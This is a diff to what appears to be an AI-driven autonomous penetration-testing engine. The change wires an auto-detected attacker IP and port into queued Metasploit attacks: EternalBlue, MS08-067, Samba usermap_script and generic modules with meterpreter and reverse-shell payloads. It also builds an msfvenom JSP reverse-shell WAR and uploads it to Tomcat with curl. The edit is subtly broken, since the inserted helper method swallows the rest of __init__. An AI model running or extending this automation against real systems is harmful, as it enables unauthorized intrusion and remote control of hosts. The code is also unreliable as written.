@@ -4669,14 +4669,41 @@ AUTOPILOT_LOCK = threading.Lock()
 
 
 class AutonomousEngine:
-    def __init__(self, project_id, targets, mode="normal", ollama_model="llama3", living_report_interval=300):
+    def __init__(self, project_id, targets, mode="normal", ollama_model="llama3", living_report_interval=300,
+                 lhost="", lport="4444"):
         self.project_id = project_id
         self.targets = targets
         self.mode = mode
         self.ollama_model = ollama_model
         self.living_report_interval = living_report_interval
+        self.lhost = lhost or self._detect_lhost()
+        self.lport = str(lport)
 
         self._running = False
+
+    @staticmethod
+    def _detect_lhost():
+        """Auto-detect the attacker IP (tun0 for VPN, then eth0, then any non-loopback)."""
+        try:
+            import socket as _sock
+            for iface_name in ("tun0", "tap0", "eth0", "ens33", "ens3", "wlan0"):
+                try:
+                    import fcntl, struct
+                    s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+                    ip = _sock.inet_ntoa(fcntl.ioctl(
+                        s.fileno(), 0x8915,
+                        struct.pack('256s', iface_name[:15].encode())
+                    )[20:24])
+                    if ip and not ip.startswith("127."):
+                        return ip
+                except Exception:
+                    continue
+            # Fallback: connect to determine outbound IP
+            with _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM) as s:
+                s.connect(("8.8.8.8", 80))
+                return s.getsockname()[0]
+        except Exception:
+            return "YOUR_LHOST"
         self._thread = None
         self._brain_log: list = []
         self._brain_log_lock = threading.Lock()
@@ -5090,7 +5117,7 @@ class AutonomousEngine:
             self._log(f"EXPLOIT [{target}:{port}] Samba 3.x usermap_script — probando")
             self._enqueue(2, f"Samba-UserMap:{target}",
                 f"msfconsole -q -x 'use exploit/multi/samba/usermap_script; "
-                f"set RHOSTS {target}; set LHOST 0.0.0.0; set PAYLOAD cmd/unix/reverse;"
+                f"set RHOSTS {target}; set LHOST {self.lhost}; set PAYLOAD cmd/unix/reverse;"
                 f" run; sleep 10; exit' 2>/dev/null", target)
 
         # Redis no-auth RCE
@@ -5144,7 +5171,7 @@ class AutonomousEngine:
                 self._enqueue(8, f"MSF-Exploit:{target}:{port}",
                     f"msfconsole -q -x \"use {msf_modules[0]};"
                     f" set RHOSTS {target}; set RPORT {port};"
-                    f" set LHOST 0.0.0.0; set ExitOnSession false; run -j; sleep 20; sessions -l; exit\""
+                    f" set LHOST {self.lhost}; set LPORT {self.lport}; set ExitOnSession false; run -j; sleep 20; sessions -l; exit\""
                     f" 2>/dev/null", target)
         else:
             exploits = len([l for l in out.split("\n") if "|" in l])
@@ -5435,8 +5462,8 @@ class AutonomousEngine:
             self._log(f"REACT [{target}] MS17-010 CONFIRMADO → EternalBlue AHORA")
             self._enqueue(0, f"EternalBlue:{target}",
                 f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
-                f"set RHOSTS {target}; set LHOST 0.0.0.0; "
-                f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LPORT 4444; "
+                f"set RHOSTS {target}; set LHOST {self.lhost}; "
+                f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LPORT {self.lport}; "
                 f"set ExitOnSession false; run -j; sleep 30; sessions -l; exit' 2>/dev/null", target)
 
         # MS08-067 VULNERABLE
@@ -5444,7 +5471,8 @@ class AutonomousEngine:
             self._log(f"REACT [{target}] MS08-067 → MSF netapi")
             self._enqueue(0, f"MS08067:{target}",
                 f"msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; "
-                f"set RHOSTS {target}; set LHOST 0.0.0.0; run; sleep 20; sessions -l; exit' 2>/dev/null", target)
+                f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                f"run; sleep 20; sessions -l; exit' 2>/dev/null", target)
 
         # SMB Pwn3d! → Impacket chain (extract user:pass from crackmapexec output)
         if re.search(r'Pwn3d!|\(Pwn3d!\)', output, re.I):
@@ -5798,10 +5826,11 @@ class AutonomousEngine:
         if not module:
             return
         rport = port or 445
-        lhost = "0.0.0.0"
+        lhost = self.lhost
+        lport_use = lport or self.lport
         if payload:
             msf_cmd = (f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {rport}; "
-                       f"set LHOST {lhost}; set LPORT {lport}; set PAYLOAD {payload}; "
+                       f"set LHOST {lhost}; set LPORT {lport_use}; set PAYLOAD {payload}; "
                        f"set ExitOnSession false; run -j; sleep 25; sessions -l; exit' 2>/dev/null")
         else:
             msf_cmd = (f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {rport}; "
@@ -6113,7 +6142,7 @@ class AutonomousEngine:
                     f"if [ \"$CODE\" = \"200\" ]; then echo \"TOMCAT_CREDS_VALID:$u:$p\"; break 2; fi; done; done", target)
             # WAR upload RCE
             self._enqueue(2, f"Tomcat-WAR-Upload:{target}:{port}",
-                f"msfvenom -p java/jsp_shell_reverse_tcp LHOST=0.0.0.0 LPORT=4445 -f war -o /tmp/t_shell_{port}.war 2>/dev/null && "
+                f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f war -o /tmp/t_shell_{port}.war 2>/dev/null && "
                 f"curl -s -u '{u}:{p}' '{url}/manager/deploy?path=/shell{port}&update=true' "
                 f"--upload-file /tmp/t_shell_{port}.war 2>/dev/null | head -3; "
                 f"curl -s '{url}/shell{port}/' 2>/dev/null | head -3", target)
@@ -6283,7 +6312,9 @@ def autopilot_start(project_id):
             return jsonify({"error": "Already running"}), 409
         engine = AutonomousEngine(project_id, targets_raw, mode,
                                   data.get("ollama_model", "llama3"),
-                                  int(data.get("living_interval", 300)))
+                                  int(data.get("living_interval", 300)),
+                                  lhost=data.get("lhost", ""),
+                                  lport=data.get("lport", "4444"))
         AUTOPILOT_ENGINES[project_id] = engine
         engine.start()
     return jsonify({"ok": True, "mode": mode, "targets": targets_raw}), 202
